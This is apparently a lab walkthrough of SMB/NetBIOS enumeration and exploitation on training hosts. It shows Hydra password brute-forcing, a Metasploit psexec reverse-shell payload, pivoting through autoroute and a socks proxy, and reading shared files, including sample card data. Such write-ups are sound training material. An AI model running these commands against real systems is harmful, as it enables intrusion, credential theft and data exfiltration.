# SMB & NetBIOS Enumeration

### Commands and Modules
`nbtscan`\
Scans network for NetBIOS name information

`psexec`\
Uses a vailed administrator username and password (or password hash) to execute and arbitrary payload

`Socks4a Proxy Server`\
Provides a socks4a proxy server with built-in Metasploit routing relay connections\
Should have configured with the following parameters\
"/etc/proxychains4.conf"

Preparation
```bash
# Check provided machines (demo and demo1)
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.14       INE
127.0.0.1 AttackDefense-Kali
10.10.43.3      INE
10.0.27.159    demo.ine.local
10.0.29.44    demo1.ine.local

# demo is reachable
└─# ping 10.0.27.159
PING 10.0.27.159 (10.0.27.159) 56(84) bytes of data.
64 bytes from 10.0.27.159: icmp_seq=1 ttl=125 time=4.78 ms
64 bytes from 10.0.27.159: icmp_seq=2 ttl=125 time=2.92 ms
64 bytes from 10.0.27.159: icmp_seq=3 ttl=125 time=2.63 ms
64 bytes from 10.0.27.159: icmp_seq=4 ttl=125 time=2.64 ms
```

```bash
# Network mapping
# NetBIOS running on port 139, SMB on port 445
└─# nmap demo.ine.local    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 10:28 IST
Nmap scan report for demo.ine.local (10.0.27.159)
Host is up (0.0026s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn    <- NetBIOS
445/tcp   open  microsoft-ds   <- SMB
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown

# Servive detection
└─# nmap -sV -O 10.0.27.159
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 10:50 IST
Nmap scan report for demo.ine.local (10.0.27.159)
Host is up (0.0027s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
```
Gather information
```bash
# Search available SMB Nmap scripts
└─# ls -al /usr/share/nmap/scripts/ | grep -e "smb-*"
-rw-r--r-- 1 root root  3753 Jun 20  2024 smb2-capabilities.nse
-rw-r--r-- 1 root root  2689 Jun 20  2024 smb2-security-mode.nse
-rw-r--r-- 1 root root  1408 Jun 20  2024 smb2-time.nse
-rw-r--r-- 1 root root  5269 Jun 20  2024 smb2-vuln-uptime.nse
-rw-r--r-- 1 root root 45061 Jun 20  2024 smb-brute.nse
-rw-r--r-- 1 root root  5289 Jun 20  2024 smb-double-pulsar-backdoor.nse
-rw-r--r-- 1 root root  4840 Jun 20  2024 smb-enum-domains.nse
-rw-r--r-- 1 root root  5971 Jun 20  2024 smb-enum-groups.nse
-rw-r--r-- 1 root root  8043 Jun 20  2024 smb-enum-processes.nse
-rw-r--r-- 1 root root 27274 Jun 20  2024 smb-enum-services.nse

# Scan protocols for port 445 
└─# nmap -p 445 --script smb-protocols demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 11:40 IST
Nmap scan report for demo.ine.local (10.0.22.228)
Host is up (0.0030s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|_    3:0:2

# Security levels that has been configured
└─# nmap -p 445 --script smb-security-mode demo.ine.local        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 11:41 IST
Nmap scan report for demo.ine.local (10.0.22.228)
Host is up (0.0029s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

# "account_used: guest"
# This clarifies that the Nmap script uses the "guest" user for all the smb script scan
Host script results:
| smb-security-mode: 
|   account_used: guest   
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


# Trying anonymous access
└─# smbclient -L 10.0.22.228                                              
Password for [WORKGROUP\root]: [Enter]
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Documents       Disk      
        Downloads       Disk      
        IPC$            IPC       Remote IPC
        print$          Disk      Printer Drivers
        Public          Disk      
```

Gain access with Username and Password
```bash
# User enumeration with Nmap
└─# nmap -p445 --script smb-enum-users.nse 10.0.22.228 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 11:45 IST
Nmap scan report for demo.ine.local (10.0.22.228)
Host is up (0.0045s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

# admin, administrator, root and guest
Host script results:
| smb-enum-users: 
|   ATTACKDEFENSE\admin (RID: 1009)
|     Flags:       Normal user account, Password does not expire
|   ATTACKDEFENSE\Administrator (RID: 500)
|     Description: Built-in account for administering the computer/domain
|     Flags:       Normal user account, Password does not expire
|   ATTACKDEFENSE\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Password not required, Account disabled, Normal user account, Password does not expire
|   ATTACKDEFENSE\root (RID: 1010)
|_    Flags:       Normal user account, Password does not expire

# Create User.txt with usernames found

# Bruteforce password
┌──(root㉿INE)-[~]
└─# hydra -L /root/Desktop/user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

# admin:tinkerbell
# administrator:password1
# root:elizabeth
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-22 11:50:02
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 3027 login tries (l:3/p:1009), ~3027 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: admin   password: tinkerbell
[445][smb] host: demo.ine.local   login: Administrator   password: password1   
[445][smb] host: demo.ine.local   login: root   password: elizabeth
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-22 11:50:05


# Start Metasploit quitely
└─# msfconsole -q 
msf6 >

msf6 > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   1   exploit/windows/smb/smb_relay                2001-03-31       excellent  No     MS08-068 Microsoft Windows SMB Relay Code Execution          
   2     \_ action: CREATE_SMB_SESSION              .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session

# Microsoft Windows Authenticated User Code Execution
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(windows/smb/psexec) > 


msf6 exploit(windows/smb/psexec) > set RHOSTS demo.ine.local
RHOSTS => demo.ine.local
msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf6 exploit(windows/smb/psexec) > set SMBPass password1
SMBPass => password1
# Didn't work with default payload so change to x64
msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.43.3:4444 
[*] 10.0.22.228:445 - Connecting to the server...
[*] 10.0.22.228:445 - Authenticating to 10.0.22.228:445 as user 'Administrator'...
[*] 10.0.22.228:445 - Selecting PowerShell target
[*] 10.0.22.228:445 - Executing the payload...
[+] 10.0.22.228:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (201798 bytes) to 10.0.22.228
[*] Meterpreter session 1 opened (10.10.43.3:4444 -> 10.0.22.228:49445) at 2025-07-22 11:57:43 +0530

meterpreter > 
# getuid, sysinfo is available when in meterpreter session
# explore and get flag1
```

Acess demo1 from the compromised host
```bash
# Pesent with a standard shell on the target system
meterpreter > shell
Process 2216 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

# Check if demo1 is reachable
C:\Windows\system32>ping 10.0.24.71
ping 10.0.24.71

Pinging 10.0.24.71 with 32 bytes of data:
Reply from 10.0.24.71: bytes=32 time=1ms TTL=128
Reply from 10.0.24.71: bytes=32 time<1ms TTL=128
Reply from 10.0.24.71: bytes=32 time<1ms TTL=128

Terminate channel 1? [y/N]  y

# Can't access demo1 from Kali machine
# -> Perform pivoting by adding route from the Metasploit framwork

# Add route using the meterpreter session and identify the second machine service
meterpreter > run autoroute -s 10.0.24.0/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.0.24.0/255.255.240.0...
[+] Added route to 10.0.24.0/255.255.240.0 via 10.0.22.228
[*] Use the -p option to list all active routes

# Put the session background
meterpreter > background
[*] Backgrounding session 1...

# Configure proxychain and notice its running on port 9050
└─# cat /etc/proxychains4.conf
~~~~
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4 127.0.0.1 9050

# Run Metasploit socks proxy auxiliary server module on port 9050
msf6 exploit(windows/smb/psexec) > search socks
msf6 exploit(windows/smb/psexec) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
VERSION => 4a
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050

msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > 

└─# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:4822          0.0.0.0:*               LISTEN      20/guacd            
tcp        0      0 127.0.0.11:33149        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      77/rinetd           
tcp        0      0 0.0.0.0:9050            0.0.0.0:*               LISTEN      10946/ruby          


# Run Nmap with proxychain to identify SMB port on the pivot machine (demo1)
# -sT : TCP connect scan
# -Pn Skip host discovery and force port scan
└─# proxychains nmap demo1.ine.local -sT -Pn -sV -p 445                   
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-22 12:08 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.0.24.71:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.0.24.71:445  ...  OK
Nmap scan report for demo1.ine.local (10.0.24.71)
Host is up (0.069s latency).

# SMB running on port 445 on demo1
PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
Service Info: OS: Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

```bash
# Interact with the meterpreter session again
msf6 auxiliary(server/socks_proxy) > sessions

Active sessions
===============

  Id  Name  Type                Information          Connection
  --  ----  ----                -----------          ----------
  1         meterpreter x64/wi  NT AUTHORITY\SYSTEM  10.10.43.3:4444 ->
            ndows                @ ATTACKDEFENSE     10.0.22.228:49445 (
                                                     10.0.22.228)


msf6 auxiliary(server/socks_proxy) > sessions 1
[*] Starting interaction with 1...

meterpreter > 


meterpreter > shell
Process 2120 created.
Channel 4 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

# Access denied
C:\Windows\system32>net view 10.0.24.71
net view 10.0.24.71
System error 5 has occurred.

Access is denied.

# Migrate to explorer
C:\Windows\system32>^C
Terminate channel 4? [y/N]  y
meterpreter > migrate -N explorer.exe
[*] Migrating from 2968 to 2728...
[*] Migration completed successfully.
meterpreter > shell
Process 2956 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

# Reaccess
C:\Windows\system32>net view 10.0.24.71
net view 10.0.24.71
Shared resources at 10.0.24.71


# Can see thow shared resources (Documents and K drive)
# -> Confirm that demo1 allows Null Sessions
Share name  Type  Used as  Comment  

-------------------------------------------------------------------------------
Documents   Disk                    
K           Disk                    
The command completed successfully.

# Map both resources to D and K drives
C:\Windows\system32>net use D: \\10.0.24.71\Documents
net use D: \\10.0.24.71\Documents
The command completed successfully.

C:\Windows\system32>net use K: \\10.0.24.71\K$
net use K: \\10.0.24.71\K$
The command completed successfully.

C:\Windows\system32>dir D:\
dir D:\
 Volume in drive D has no label.
 Volume Serial Number is 5CD6-020B

 Directory of D:\

01/04/2022  05:22 AM    <DIR>          .
01/04/2022  05:22 AM    <DIR>          ..
01/04/2022  05:07 AM             1,425 Confidential.txt
01/04/2022  05:22 AM                70 FLAG2.txt
               2 File(s)          1,495 bytes
               2 Dir(s)   6,608,437,248 bytes free


# Get FLAG2
C:\Windows\system32>^C
Terminate channel 1? [y/N]  y
meterpreter > cat D:\\Confidential.txt
 1 .  BRAND : VISA
        NUMBER : 4338562361312261
        BANK : 1ST ADVANTAGE BANK
        NAME : Martin Skorstad
        ADDRESS : 2019 Karen Lane
        COUNTRY : UNITED STATES
        MONEY : $582
        CVV/CVV2 : 535
        EXPIRY : 10/2029
        PIN : 8431
~~~~~~~

meterpreter > cat D:\\FLAG2.txt
��c8f58de67f44f49264e6c99e8f17110c
```
